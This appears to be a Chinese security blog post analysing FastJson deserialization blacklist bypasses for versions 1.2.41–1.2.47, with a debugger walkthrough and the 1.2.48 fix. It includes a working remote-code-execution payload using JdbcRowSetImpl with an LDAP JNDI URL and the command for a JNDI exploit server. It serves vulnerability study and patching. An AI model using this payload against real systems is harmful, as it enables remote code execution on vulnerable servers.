> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/qRbfZK0UX4v2YwdfWDlSeA)

![](https://mmbiz.qpic.cn/mmbiz_jpg/Ok4fxxCpBb4LVlcaUUZQM1mPzFmJXhrnduf2BObl6T3vhjJLelYTb5yHDr9CaCKJtBZRDgOm82RaeWJ7iaE2Mlg/640?wx_fmt=jpeg)

  

01

前言

上篇文章学习了 FastJson 的第一版漏洞，曝出后官方立马做了更新，增加了 checkAutoType() 函数，并默认关闭 autotype，在这之后一段时间内的绕过都与它有关。本文主要关于 FastJson<=1.2.47 的相关漏洞。

  

02

1.2.41-1.2.43 的缠绵不休

这三个版本的修复可以说是非常偷懒了，所以才会连续因为一个原因曝出多个问题。

```
if (className.charAt(0) == '[') {
    Class<?> componentType = loadClass(className.substring(1), classLoader);
    return Array.newInstance(componentType, 0).getClass();
}

if (className.startsWith("L") && className.endsWith(";")) {
    String newClassName = className.substring(1, className.length() - 1);
    return loadClass(newClassName, classLoader);
}

```

从 1.2.41 说起。在 checkAutotype() 函数中，会先检查传入的 @type 的值是否是在黑名单里，如果要反序列化的类不在黑名单中，那么才会对其进行反序列化。问题来了，在反序列化前，会经过 loadClass() 函数进行处理，其中一个处理方法是：在加载类的时候会去掉 className 前后的 L 和;。所以，如果我们传入 Lcom.sun.rowset.JdbcRowSetImpl;，在经过黑白名单后，在加载类时会去掉前后的 L 和;，就变成了 com.sun.rowset.JdbcRowSetImpl，反序列化了恶意类。

更新了 1.2.42，方法是先判断反序列化目标类的类名前后是不是 L 和;，如果是，那么先去掉 L 和;，再进行黑白名单校验（偷懒 qaq）。关于 1.2.42 绕过非常简单，只需要双写 L 和;，就可以在第一步去掉 L 和; 后，与 1.2.41 相同。

更新也非常随意，在 1.2.43 中，黑白名单判断前，又增加了一个是否以 LL 开头的判断，如果以 LL 开头，那么就直接抛异常，非常随意解决了双写的问题。但是除了 L 和;，FastJson 在加载类的时候，不只对 L 和; 这样的类进行特殊处理，[也对特殊处理了，所以，同样的方式在前面添加 [绕过了 1.2.43 及之前的补丁。

在 1.2.44 中，黑客们烦不烦，来了个狠的：只要你以 [开头或者; 结尾，我直接抛一个异常。如此，终于解决了缠绵多个版本的漏洞。

  

03

<=1.2.47 的双键调用分析

### **漏洞原理**

FastJson 有一个全局缓存机制：在解析 json 数据前会先加载相关配置，调用 addBaseClassMappings() 和 loadClass() 函数将一些基础类和第三方库存放到 mappings 中（mappings 是 ConcurrentMap 类，所以我们在一次连接中传入两个键值 a 和 b，具体内容见下文）。  
之后在解析时，如果没有开启 autotype，会从 mappings 或 deserializers.findClass() 函数中获取反序列化的对应类，如果有，则直接返回绕过了黑名单。  
本次要利用的是 java.lang.Class 类，其反序列化处理类 MiscCodec 类可以将任意类加载到 mappings 中，实现了目标。

### **环境搭建**

环境：IDEA + JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar

新建 maven 项目后添加 1.2.47 版本的 fastjson，并创建 fastjson1_2_47.java 文件

```
package person;
import com.alibaba.fastjson.JSON;
public class fastjson1_2_47 {
    public static void main(String[] argv){
        testJdbcRowSetImpl();
    }
    public static void testJdbcRowSetImpl(){
        String payload = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}," +
                "\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":" +
                "\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":true}}}";
        JSON.parse(payload);
    }

}

```

使用 JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar 搭建 ldap 服务

```
java -jar .\JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C calc -A 127.0.0.1

```

运行代码，触发 poc

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4LVlcaUUZQM1mPzFmJXhrnDwqyhjckE3ODcp4MuxCFk8dO5KKpeBY5IWYR3qYoqo8tpa1RBn7g6A/640?wx_fmt=png)

### **动态分析**

首先在 JSON.parse(payload); 下断点后调试

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4LVlcaUUZQM1mPzFmJXhrnzkPjw2j5j4tNrer1icTdwIIHn3x85VrbLynP31VSBMhh1Aed6jH5tibg/640?wx_fmt=png)

之后单步步入，过程类似于上篇文章中的调用过程，我们直到 DefaultJSONParser.java 的 parseObject() 函数

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4LVlcaUUZQM1mPzFmJXhrnAIXeXXKbASAhLTathZooZj0GsUkE3z8nEoezK7fBP2rsvRVyvSpJ5A/640?wx_fmt=png)

下面就进入一个 for 循环获取并处理我们的 payload，我们跟进到如图所示位置，从这里开始就和 1.2.24 的调用不同了。可以看到我们获取了第一段 key 为 a，由于不是 @type 属性，我们会跳过这个 if（里面有 checkAutoType() 和 deserializer.deserialze()，我们一会就会回来），继续跟进

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4LVlcaUUZQM1mPzFmJXhrnB4MrRVdMbwu6rsxic55Ooa5iawUGodiaicy3ia54pjISDHFm7FVBuicDApkQ/640?wx_fmt=png)

我们跟进到这里，开始处理 a 内 {里面的内容

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4LVlcaUUZQM1mPzFmJXhrnrK6rW4HVNtzHT7eibNXeVbSIMbzeAQ5K2GT3OuYQKm1Jbn29AHYnBzA/640?wx_fmt=png)

接下来调用 this.parseObject()，正式进入嵌套，获取处理 key 为 a 的内部内容，单步步入后，我们发现又进入了上面进入过的 for 循环，并且获取的 key 为 @type，进入上面说的 if 段

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4LVlcaUUZQM1mPzFmJXhrnckxw3NTGYl1rtOrdGN0YbIgAzKBKJfnUVIicyYVlb9EpHaU2OdztpSg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4LVlcaUUZQM1mPzFmJXhrn1YYXBl4Po5qp75tUBuCBJMdsv1f0khw8pu33fBS2Rgofc8icoEAVLWA/640?wx_fmt=png)

调用了 checkAutoType() 来检查目标类是否符合要求，这里我们不跟进去看了，在分析 b 段的时候再跟进去。这里我们只要知道，我们利用的 java.lang.Class 是可以通过校验的就可以了，所以我们单步步过

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4LVlcaUUZQM1mPzFmJXhrnZGSTzB9l0PMSXGmiaNZ1lnTwGtooJmWxtxw9BicqKX6GHapNmW3Nh0Kw/640?wx_fmt=png)

通过 checkAutoType() 后获取到 clazz 为 java.lang.Class，之后调用了对应的序列化处理类 com.alibaba.fastjson.serializer.MiscCodec()，这里就是核心，我们单步步入

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4LVlcaUUZQM1mPzFmJXhrnxKMXyibTXe35rIZIl8udlXxZqMEvlULTJ9G26Qgk9icRtnt6CVaNGbGQ/640?wx_fmt=png)

可以看到我们进入到 MiscCodec.java 的 deserialze() 中，首先调用 parser.parse() 从 payload 中获取 val 对应的键值，也就是 JdbcRowSetImpl 类，并赋值给 strVal，我们继续跟进

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4LVlcaUUZQM1mPzFmJXhrnPaQTXvpw0Un3w0IYpibYS61nJ4BdSwHaqt8YLcYKzicG2JNE1eq5ALpg/640?wx_fmt=png)

接下来有一堆 if 判断，会对我们要反序列化的类进行一个类型的判断，直到如图位置，我们进入 TypeUtils.loadClass() 函数，这里默认 cache 为 true

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4LVlcaUUZQM1mPzFmJXhrnf41pvPLBElXaI1GFNzDbk3gvLurpibxFt5RUhF316bmbRNbb7YekGBg/640?wx_fmt=png)

在 TypeUtils.loadClass() 中，cache 为 true 时，将键值对应的类名放到 mappings 中

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4LVlcaUUZQM1mPzFmJXhrnnU6cibYpicEnNJtlO1pRsOlRGym4Eqz8vZqyLQLgVNuWGYVeDoak52Pg/640?wx_fmt=png)

（到目前为止我们已经成功将恶意类 com.sun.rowset.JdbcRowSetImpl 加载到 mappings 中，接下来我们继续跟进解析传入的第二个键值 b 的内容，实现恶意类的 jdni 注入利用）

在完成 loadClass() 后会向上层返回，如图，继续跟进后回到 for 循环正式开始解析键值 b 的内容，获取到 bkey 为 b 后，类似于 a 那里，会跳过这个 if 段，在下面再次调用 parseObject() 来处理 b 内部内容，我们直接跟进下面的 parseObject()

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4LVlcaUUZQM1mPzFmJXhrnCGNAjryQbeBfBhpT3nbdChnB4Tfqzq6mC4Sf9G4pE3VBH18wR7NicjA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4LVlcaUUZQM1mPzFmJXhrnWT62b12Q8Zz71QqSSicNKPezDJUYKJZUgaLta3TXarRG7GY9d4D3iafg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4LVlcaUUZQM1mPzFmJXhrnFQk1XLh6HXzhdOuGvWJU1M0GG3Z7HuYsl532XYg7eibqPzhtYS76waQ/640?wx_fmt=png)

在 parseObject() 中继续跟进到入 checkAutoType()，这次我们进入 checkAutoType() 看一下

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4LVlcaUUZQM1mPzFmJXhrn3ZVk0CDIY2ANicicjqM8SJTkYmzdL7VicbkTjsiaBbyDf5IQcU6KfnC13w/640?wx_fmt=png)

在 checkAutoType 内部，没有开启 autotype，直接从 mappings 中获取，然后返回，一气呵成，黑白名单完全没用

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4LVlcaUUZQM1mPzFmJXhrn36dAHic1FGYgQlZgDgLiaHpib2T0pK0FuvHggJibAcHguP6RUdZDOdf7xw/640?wx_fmt=png)

接下来会调用 deserializer.deserialze() 和 1.2.24 一样，造成 rce

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4LVlcaUUZQM1mPzFmJXhrnibSGiaUf10R3pZ4Djicj4lnXG6sWaic2B0XygvN5bjJnUEJkzuUFVG7F0Q/640?wx_fmt=png)

完整调用链：

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb4LVlcaUUZQM1mPzFmJXhrn6JKVWhvsSib2BQcqlZlKRILU4UnbZwtc8e3cJC0Jy85P1a5H910ibHoA/640?wx_fmt=png)

  

04

总结和修复

本次利用分两步：

第一步利用 java.lang.Class 将恶意类加载到 mappings 中；

第二步从 mappings 中取出恶意类并绕过黑名单进行了反序列化。

在 1.2.48 中，首先将 java.lang.class 类加入黑名单，然后将 MiscCodec 类中的 cache 参数默认为 false，对于 checkAutoType() 也调整相关逻辑。尽快升级，据说当年 hw 一片。

  

05

结语

上面首先讲述了 1.2.41-1.2.43 的愚蠢问题，之后跟踪了 <=1.2.47 的 RCE，相信已经非常清楚了，在之后 FastJson 又曝出了其他问题，下篇文章继续学习。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6OLwHohYU7UjX5anusw3ZzxxUKM0Ert9iaakSvib40glppuwsWytjDfiaFx1T25gsIWL5c8c7kicamxw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/Ok4fxxCpBb5ZMeq0JBK8AOH3CVMApDrPvnibHjxDDT1mY2ic8ABv6zWUDq0VxcQ128rL7lxiaQrE1oTmjqInO89xA/640?wx_fmt=gif)  

------------------------------------------------------------------------------------------------------------------------------------------------

**戳 “阅读原文” 查看更多内容**